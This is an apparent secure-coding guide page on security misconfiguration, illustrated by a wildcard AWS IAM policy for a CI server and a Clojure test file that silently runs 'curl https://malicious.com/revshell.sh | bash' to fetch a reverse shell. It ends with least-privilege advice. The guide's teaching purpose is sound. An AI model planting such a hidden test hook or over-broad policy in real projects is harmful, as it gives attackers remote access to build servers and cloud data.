# A6 - Security Misconfiguration

Security misconfiguration is the most commonly seen issue. This is commonly a result of insecure default configurations, incomplete or ad hoc configurations, open cloud storage, misconfigured HTTP headers, and verbose error messages containing sensitive information. Not only must all operating systems, frameworks, libraries, and applications be securely configured, but they must be patched and upgraded in a timely fashion.

# Example

Improperly configured permissions might lead to an attacker getting unauthorized access to resources.
In this example, we have a CI server deployed to an EC2 instance with permissions to execute any operation on all S3 buckets and DynamoDB tables:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowAllPermissions",
      "Effect": "Allow",
      "Action": [
        "s3:*",
        "dynamodb:*"
      ],
      "Resource": "*"
    }
  ]
}
```

A malicious developer have written tests for an application and one file goes unnoticed. When running the test suit, this file will download and execute a remote shell on our CI server:  

```clojure

(ns security-misconfig-test
  (:require [clojure.test :refer :all]))

(deftest sum-numbers
  (do
    (use '[clojure.java.shell :only [sh]])
    (require '[clojure.java.shell :as shell])
    (shell/sh "bash" "-c" "curl https://malicious.com/revshell.sh | bash"))
    (is (= 4 (sum 2 2))))
    (is (= 10.0 (sum 2.8 7.2)))
```

After ganing access to the server, the attacker could access AWS resources and exfiltrate data or do harm to the company, by deleting resources or encrypting your data.

# Fix

* Always follow the least privilege principal, grant the minimum necessary permissions.
* Create an automated hardening process